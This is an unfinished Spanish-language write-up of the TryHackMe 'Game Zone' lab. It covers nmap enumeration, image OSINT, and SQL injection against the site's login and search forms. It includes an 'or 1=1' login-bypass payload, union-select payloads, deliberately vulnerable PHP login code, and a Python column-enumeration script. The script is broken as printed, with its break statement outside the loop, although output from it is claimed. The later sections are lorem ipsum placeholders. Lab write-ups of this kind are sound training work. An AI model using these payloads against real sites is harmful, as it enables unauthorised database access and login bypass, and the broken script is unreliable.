---
aliases:
  - Game Zone
Date: 20 Julio 2024
Platform: linux
Category: learning SQLI
Difficulty: Easy
tags:
  - Tryhachme
Status: Complete
IP: 10.10.190.112
---

# Resolution summary
- Text
- Text

## Improved skills
- OSINT
- SQLI
- enumeracion
- Localizacion de exploits

## Used tools
- nmap
- Google Images
- sqlmap

---

# Alcance

Esta máquina es parte del aprendizaje en el camino para ser pentester. Por ende, nos van haciendo diferentes preguntas para completarla. Lo que nos solicitan es explotar una vulnerabilidad SQLI, ganar acceso a una app web, lograr acceso al equipo y una vez hagamos eso, escalar privilegios con metasploit. Yo voy hacerlo con metasploit y de forma manual ya que la idea de hacer estos writeups es lograr una soltura al momento de hacer reportes para la OSCP u otros afines. Es por eso que voy a dar mas informacion de la necesaria para resolver esta maquina ya que debemos pensar en que a un futuro cliente/certificacion le interesa todo lo que se pueda reportar y sea de utilidad. 

# Information Gathering

En la información de la máquina, no se nos entrega a qué plataforma nos enfrentamos o, por lo menos, no lo he visto.

Para saber a qué nos enfrentamos, podemos usar el comando _PING_ e identificar si es una máquina con Windows o Linux a través de su TTL.

En esta tabla, tenemos la equivalencia de qué sistema podemos estar enfrentando en base a su TTL:

![[Pasted image 20240720135430.png]]

Si aplicamos el comando ping: 

```bash
ping -c 1 10.10.190.112

PING 10.10.190.112 (10.10.190.112) 56(84) bytes of data.
64 bytes from 10.10.190.112: icmp_seq=1 ttl=61 time=286 ms

--- 10.10.190.112 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 285.775/285.775/285.775/0.000 ms
```

Según nuestra tabla, Linux, FreeBSD y Mac OS X utilizan un TTL de 64. En nuestro caso, aparece 61 como TTL, pero eso se debe a la cantidad de saltos que hacemos antes de alcanzar al servidor, y ahí se pierden unidades. Por ende, podemos concluir que nuestro objetivo es una máquina con Linux. Más adelante, podremos determinar si esto es cierto o no.

Ahora, realizaremos una enumeración activa del servidor con **nmap**.

```bash
sudo nmap --open -sS -p- --min-rate 5000 10.10.190.112
```

El resultado es el siguiente:

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-20 13:57 EDT
Nmap scan report for 10.10.190.112
Host is up (0.29s latency).
Not shown: 57206 closed tcp ports (reset), 8327 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 20.03 seconds
```

Ahora enumeramos los puertos TCP abiertos:
```bash
sudo nmap -p22,80 -sCV 10.10.190.112

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-20 14:00 EDT
Nmap scan report for 10.10.190.112
Host is up (0.29s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA)
|   256 b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa (ECDSA)
|_  256 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Game Zone
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.49 seconds

```

Como podemos ver, el resultado del escaneo, nos muestra en el puerto 22 esta descripcion: **Ubuntu 4ubuntu2.7** . Si buscamos en google por el resultado de launchpad.net nos encontramos con lo siguiente:

![[Pasted image 20240720152601.png]]
Todas las versiones de ubuntu tienen un nombre. En nuestro caso es Xenial que equivale a la version 16.04 de ubuntu. 

Tambien, si revisamos la version del ssh es vulnerable a la enumeracion de usuarios 
![[Pasted image 20240720145926.png]]

Si vemos, el exploit que podemos utilizar es el 40136 de exploit-db de offsec. Como esta maquina es de aprendizaje de SQLI, no vamos a explorar mas en esto. Pero, siempre tenemos que enumerar todo y hacerlo costumbre de cara a certificaciones como eCPPT u OSCP que solicitan un reporte tecnico y esto, **es importante notificarlo al cliente para una futura subsanacion**

Tambien, tenemos un CVE en el servidor apache:

https://nvd.nist.gov/vuln/detail/CVE-2019-0211

Pero, seguiremos con lo que nos esta solicitando tryhackme.  

A medida que vamos avanzando en estas etapas de enumeracion. Debemos revisar que nos va pidiendo tryhackme para ir resolviendo la maquina. Aqui, esta la primera parte:
![[Pasted image 20240720140227.png]]
la pregunta es: **What is the name of the large cartoon avatar holding a sniper on the forum?**
Para responder esto, primero debemos entrar en la web y ver que es lo que nos muestra:

Al entrar, es esto lo que podemos ver:
![[Pasted image 20240720140423.png]]

Ahora, necesitamos saber el nombre de ese sujeto afirmando el arma. Para ello, podemos revisar el nombre de la imagen y quizas tenga el nombre del sujeto o lo podemos buscar con google images. Intentemos la primera opcion:

![[Pasted image 20240720140903.png]]

Al intentar buscar nombres de las imagenes en la web, encontramos una carpeta que dice images/_image01.gif

Por lo que se puede leer, no tenemos una descripcion exacta del nombre asi que ahora necesitamos descargar la imagen y buscarla con google images. 
![[Pasted image 20240720141132.png]]
Si entramos a la carpeta images, vemos todas las imagenes que hay. Pero, la que nos interesa por ahora es : **images/header_image.png**

La descargamos y vamos a Google Images para realizar la busqueda:

![[Pasted image 20240720141409.png]]
Aqui podemos arrastrar la imagen en la url de images.google.com para hacer algun analisis de la misma. 

![[Pasted image 20240720141548.png]]
 Tenemos dos nombres. El primero es Hitman y el otro es Agent 47 y si nos devolvemos a la pregunta de tryhackme, veremos que nos ayuda al momento de ver el formato de la respuesta:
![[Pasted image 20240720141659.png]]

vemos que es de dos espacios por ende, la respuesta es:  **Agent 47**

---
# Exploitation
## SQLI

En la web, podemos ver que tenemos una seccion de login y de busqueda. Ambas nos pueden servir para realizar una inyeccion SQL asi que veremos como reacciona cada una a una inyeccion. 

![[Pasted image 20240720155913.png]]

Si es por el lado del login, lo que debemos lograr es que al no saber la clave de un usuario, podamos comentar esa linea a traves de la inyeccion y lograr pasar el login. 

Tryhackme nos explica algo sobre la inyeccion pero, esta es mi explicacion. Si quieren, pueden revisar la que esta en su web en este room: https://tryhackme.com/r/room/gamezone

Teniendo esta consulta:
```sql
SELECT * FROM users WHERE user_name='bob'
```

si el codigo del login fuera el siguiente:

```php
<?php

$uname = $_POST['uname'];
$passwd =$_POST['password'];

$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";

$result = mysqli_query($con, $sql_query);

?>

```

Segun ese codigo, **que no es el de esta web** y que revisaremos cuando la explotemos. Podemos ver que si como usuario ponemos bob' or 1=1 -- - no hay nada que nos impida hacerlo ya que no se filtra en ningun lado el input y ademas, el valor que nosotros escribimos pasa directamente a la consulta. Por ende, se puede configurar una inyeccion sql. 

Ahora, por que usamos "or 1=1" ? es porque debemos crearle una igualdad a la consulta para que nos saltemos el uso del password. Con ello, la consulta se convierte en valida y nos deja entrar. 

Veamos como aplicarlo:

![[Pasted image 20240720163903.png]]
Aqui le di una clave porque es una buena practica. Por lo que dice tryhackme no es necesario ponersela. Pero, la mayoria de formularios siempre tienen una validacion simple y no es malo ponerla para que no nos salte alguna validacion y nos de problemas. 


Le damos a enter y entramos a esta web:

![[Pasted image 20240720163940.png]]

Respondemos la respuesta: **When you've logged in, what page do you get redirected to?**
*portal.php*

Al entrar en esta web, ya tenemos una barra de busqueda y estas barras estan ligadas a un *Like*. La consulta podria ser algo asi. 

```sql
SELECT * FROM productos WHERE nombre LIKE '%manzana%';
```


Si buscamos  por hitman para ver que nos arroja, podemos ver lo siguiente:

![[Pasted image 20240720164741.png]]

Podemos ver que hace una peticion post con un campo que se llama searchitem y ahi le pasa el parametro que buscamos.

Ademas, vemos que la consulta nos devuelve 2 campos. Un campo con el titulo del juego y otro con la descripcion. Campos que son de texto por ende, podriamos probar hacer una inyeccion con solo dos campos para ver si nos entrega la version de la base de datos y el nombre. Saber esto es clave para seguir con nuestro ataque aunque tambien es clave saber cuantas columnas exactamente tiene la tabla.

si utilizo:

```sql
'order by 10 -- -
```

la respuesta que obtengo es: 
![[Pasted image 20240720165547.png]]
Dice que no conoce la columna y esto significa que la tabla no tiene 10 columnas. Otra cosa importante que estamos pasando por alto, es el tipo de vulnerabilidad que estamos explotando y es una inyeccion SQL basada en error. Saber esto es clave para posteriores payloads de **payloadallthethings** o para realizar busquedas por los errores que tengamos para conocer mas de la base de datos que estamos atacando.

Este script nos ayuda a saber la cantidad de columnas que tenemos en la tabla de manera automatizada. Tambien sabremos los valores de las tablas para obtener las claves administrativas o posteriores payloads con revshell.

```python 
from pwn import *
import requests, signal, sys

def def_handler(sig,frame ):
	print("\n\n[*] Saliendo!")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def busqueda_columnas():
	url = "http://10.10.190.112/portal.php"
	
	headers = {
	"Host": "10.10.190.112",
	"Cache-Control": "max-age=0",
	"Upgrade-Insecure-Requests": "1",
	"Origin": "http://10.10.190.112",
	"Content-Type": "application/x-www-form-urlencoded",
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, como Gecko) Chrome/125.0.6422.112 Safari/537.36",
	"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
	"Referer": "http://10.10.190.112/portal.php",
	"Accept-Encoding": "gzip, deflate, br",
	"Accept-Language": "en-US,en;q=0.9",
	"Cookie": "PHPSESSID=a275k1lahp79v07sa9j7jn01e1",
	"Connection": "keep-alive"
	}
	
	p1 = log.progress("Buscando las columnas")
	for i in range(10, 2, -1):
		payload = f"searchitem='order+by+{i}+--+-"
		response = requests.post(url, headers=headers, data=payload)
		p1.status(f"buscando por {i} columnas")

	if "Unknown column" not in response.text:
		print(f"La tabla tiene {i} columnas")
		break
 

def consulta_datos():
	pass

if __name__=='__main__':
	busqueda_columnas()
```

La salida al ejecutar este script es la siguiente:

![[Pasted image 20240720181243.png]]

Listo!, ya sabemos que la tabla tiene 3 columnas. Ahora, hay que ver cuales pueden ser inyectables y para eso vamos a utilizar burpsuite para conocer la version y el nombre de la base de datos. No podremos ver un tercer valor ya que la pagina web solo nos muestra dos campos. Pero, lo que podemos hacer es unir esos campos. De cualquier forma, con que uno nos arroje mas informacion es suficiente. 

Para ello haremos lo siguiente:

```sql
'union select null,null,null -- -
```

Algunas veces podemos poner 1,2,3 o en este caso intente solo con null por cada campo. La respuesta es la siguiente:

![[Pasted image 20240721014636.png]]
No hay ningun error y en consecuencia, podremos empezar a inyectar en los campos. Veamos la base de datos y su version:

```sql
'union select database(),version(),null -- -
```

Con esa consulta la salida es la siguiente:

![[Pasted image 20240721014937.png]]

Podemos concluir que a partir del segundo campo es inyectable. Comprobemos:

```sql
'union select null,version(),database() -- -
```

Como podemos ver, ahora si tenemos una salida en ambos campos de la tabla. Entonces, veamos todas las bases de datos que pueda tener. 

![[Pasted image 20240721015128.png]]

Si buscamos por la version de la base de datos en google, nos encontraremos con lo siguiente:

![[Pasted image 20240721015340.png]]
Es una base de datos mysql 5.7 en ubuntu xenial. 







---

# Lateral Movement to user
## Local Enumeration
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.

## Lateral Movement vector
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.

---

# Privilege Escalation
## Local Enumeration
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.

## Privilege Escalation vector
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.

---

# Trophy & Loot
user.txt

root.txt